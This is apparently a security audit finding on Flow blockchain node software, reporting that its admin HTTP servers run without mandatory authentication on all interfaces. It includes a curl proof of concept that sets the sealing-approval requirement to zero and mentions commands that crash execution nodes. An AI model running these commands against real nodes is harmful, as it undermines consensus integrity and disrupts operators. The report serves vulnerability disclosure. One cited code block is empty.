### Title
Unauthenticated Admin HTTP Server Exposes Privileged Node Control Commands — (`admin/command_runner.go`, `cmd/ledger/admin.go`)

### Summary
The Flow node admin HTTP server (`/admin/run_command`) and the ledger service admin server have no mandatory authentication. When bound to `0.0.0.0` — as shown in official deployment templates — any network-reachable attacker can invoke privileged commands including setting `consensus-required-approvals-for-sealing=0` on a consensus node, which bypasses the verification approval requirement for block sealing and directly degrades the protocol's integrity guarantees without requiring control of any staked node.

### Finding Description

**Root cause 1 — Main node admin server (`admin/command_runner.go`)**

`runAdminServer` starts the HTTP server with no authentication when TLS is not configured:

```go
if r.tlsConfig == nil {
    err = httpServer.ListenAndServe()   // plain HTTP, no auth
} else {
    err = httpServer.ListenAndServeTLS("", "")
}
```

TLS is only applied in `EnqueueAdminServerInit` when the operator explicitly provides cert/key/CA flags:

```go
if node.AdminCert != NotSet {
    // ... build TLS config ...
    opts = append(opts, admin.WithTLS(config))
}
// if AdminCert is not set, no TLS, no auth
runner := fnb.adminCommandBootstrapper.Bootstrap(fnb.Logger, fnb.AdminAddr, opts...)
```

The `--admin-addr` flag accepts any bind address. Official deployment templates bind to all interfaces:

```yaml
- --admin-addr=0.0.0.0:9002
```

**Root cause 2 — Ledger service admin server (`cmd/ledger/admin.go`)**

The ledger service admin handler is a plain HTTP server with zero TLS support — no `WithTLS` option exists at all. The README explicitly documents binding to `0.0.0.0:9003`:

```go
adminServer = &http.Server{
    Addr:    *adminAddr,   // e.g. 0.0.0.0:9003
    Handler: adminHandler, // no TLS, no auth
}
```

**Privileged commands reachable without authentication:**

The `set-config` command allows changing `consensus-required-approvals-for-sealing` to 0 on a consensus node:

```go
err = node.ConfigManager.RegisterUintConfig("consensus-required-approvals-for-sealing",
    setter.RequireApprovalsForSealConstructionDynamicValue,
    setter.SetRequiredApprovalsForSealingConstruction)
```

`SetRequiredApprovalsForSealingConstruction(0)` is explicitly valid (the test confirms `err = instance.SetRequiredApprovalsForSealingConstruction(0); require.NoError(t, err)`). This atomically stores the new value and the consensus node immediately uses it for all subsequent seal construction.

### Impact Explanation

An attacker with network access to port 9002 on a consensus node (or 9003 on a ledger service node) can:

1. **Bypass verification for block sealing**: `POST /admin/run_command {"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}` causes the consensus node to construct seals with zero verification approvals, removing the verification layer from the sealing pipeline. This is a critical integrity failure in the consensus/state-transition trust model — blocks can be sealed without any verification node confirming execution correctness.

2. **Stop execution nodes at attacker-chosen heights**: `stop-at-height` with `crash:true` terminates an execution node, halting block execution at a chosen height.

3. **Expose internal protocol state**: `protocol-snapshot` returns the full serialized protocol snapshot including sealed state commitments.

The sealing approval bypass (impact 1) is the most severe: it directly weakens the protocol's security model without requiring the attacker to control any staked node.

### Likelihood Explanation

The deployment templates in `integration/benchnet2/automate/templates/helm-values-all-nodes.yml` and `integration/localnet/builder/bootstrap.go` both bind the admin server to `0.0.0.0:9002`. Operators following these templates expose the admin port on all interfaces. TLS/mTLS is opt-in and requires three separate flags (`--admin-cert`, `--admin-key`, `--admin-client-certs`); omitting any one of them leaves the server unauthenticated. The ledger service admin has no TLS option at all. Any attacker who can reach the node's network (e.g., via a misconfigured firewall, cloud security group, or co-located service) can exploit this with a single HTTP POST.

### Recommendation

- Make mutual TLS mandatory for the admin server when `--admin-addr` is set; reject startup if cert/key/CA are not all provided.
- For the ledger service admin (`cmd/ledger/admin.go`), add TLS support and require it when the admin address is not a loopback/Unix socket.
- Default `--admin-addr` to a loopback address (`127.0.0.1:9002`) or a Unix socket, not `0.0.0.0`.
- Add IP allowlist enforcement at the HTTP handler level as a defense-in-depth measure.

### Proof of Concept

```bash
# Attacker with network access to consensus node port 9002
# Step 1: Confirm admin server is unauthenticated
curl http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "list-commands"}'
# Returns list of available commands

# Step 2: Set consensus-required-approvals-for-sealing to 0
curl http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
# Returns: {"output":{"newValue":0,"oldValue":1}}
# Consensus node now constructs seals with zero verification approvals
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** admin/command_runner.go (L260-265)
```go
		var err error
		if r.tlsConfig == nil {
			err = httpServer.ListenAndServe()
		} else {
			err = httpServer.ListenAndServeTLS("", "")
		}
```

**File:** cmd/scaffold.go (L756-775)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
		}
```

**File:** cmd/ledger/admin.go (L230-243)
```go

```

**File:** integration/localnet/builder/bootstrap.go (L586-587)
```go
			fmt.Sprintf("--admin-addr=0.0.0.0:%s", testnet.AdminPort),
		},
```

**File:** integration/benchnet2/automate/templates/helm-values-all-nodes.yml (L122-122)
```yaml
        - --admin-addr=0.0.0.0:9002
```

**File:** cmd/consensus/main.go (L245-248)
```go
			err = node.ConfigManager.RegisterUintConfig("consensus-required-approvals-for-sealing",
				setter.RequireApprovalsForSealConstructionDynamicValue,
				setter.SetRequiredApprovalsForSealingConstruction)
			return err
```

**File:** module/updatable_configs/sealing_configs.go (L50-62)
```go
func (r *sealingConfigs) SetRequiredApprovalsForSealingConstruction(requiredApprovalsForSealConstruction uint) error {
	err := validation.ValidateRequireApprovals(
		requiredApprovalsForSealConstruction,
		r.requiredApprovalsForSealVerification,
		r.chunkAlpha,
	)
	if err != nil {
		return NewValidationErrorf("invalid: %w", err)
	}

	r.requiredApprovalsForSealConstruction.Store(uint32(requiredApprovalsForSealConstruction))

	return nil
```

**File:** admin/commands/common/set_config.go (L33-51)
```go
func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
```
